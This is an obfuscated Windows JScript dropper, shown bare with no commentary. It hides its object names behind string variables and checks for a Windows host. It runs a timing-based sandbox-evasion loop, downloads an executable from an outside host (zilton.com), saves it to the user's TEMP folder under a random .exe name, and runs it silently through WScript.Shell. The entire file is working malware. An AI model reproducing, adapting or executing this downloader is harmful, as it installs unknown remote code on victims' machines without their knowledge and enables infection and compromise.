var z = false;
var gr = "CreateObject";
var U = function i() {return WScript[gr]("WScript.Shell");}(), G = 11;
var O = "MSXML2.XMLHTTP";
var OK = 2123213;
var b0 = 0;
function b(d){U["Run"](d, b0, b0);};
function aB(){return "" + O;};
function W(Ae, eG){b0 = b0 * 1; return Ae - eG;};
function x(){return gr;};
/*@cc_on
  @if (@_win32 || @_win64)
    z = true;
  @end
@*/
if (z)
{
var N = "";
function OF(){return 22;};
var r0 = 0; var aj = 0;
function k()
{
var dZ = new this["Date"]();
var w = dZ["getUTCMilliseconds"]();
WScript["Sleep"](OF());
var dZ = new this["Date"]();
var r = dZ["getUTCMilliseconds"]();
WScript["Sleep"](OF());
var dZ = new this["Date"]();
var AY = dZ["getUTCMilliseconds"]();
var r0 = "NL";
r0 = W(r, w);
var aj = "y";
aj = W(AY, r);
N = "open";
return W(r0, aj);
}
var nu = false;
var Qq = false;
for (var EZ = b0; EZ < OF() * 1; EZ++){if (k() != b0){
nu = true; 
aj = "31" + 11 * r0 + aj; 
Qq = true; 
break;
}}
function jd() {return ((nu == true) && (nu == Qq)) ? 1 : b0;};
if (nu && jd() && Qq){
function dM() {return U["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "suyESTESlFvMv.exe";};
 Nj = aB();
 y0 = WScript[gr](Nj);
 var kN = 1;
 while (kN){
try {
y0[N]("GET", "http://zilton.com/o9qwp", false);
y0["send"]();
k0 = "Sleep";
for (;;){WScript[k0](OF() * 11); if (y0["readystate"] >= 2 * 2) break;};
kN = b0;
} catch(VQ){};
}
function K(S) {var c = (1, 2, 3, 4, 5, S); return c;};
H = WScript[x()]("ADODB.Stream");
Nj = H;
Nj[N]();
Nj["type"] = K(1);
Nj["write"](y0["ResponseBody"]);
H["position"] = K(b0);
Nj["Save" + "ToFile"](dM(), 2);
H["c"+"lose"]();
i0 = dM();
b(i0);
}
}

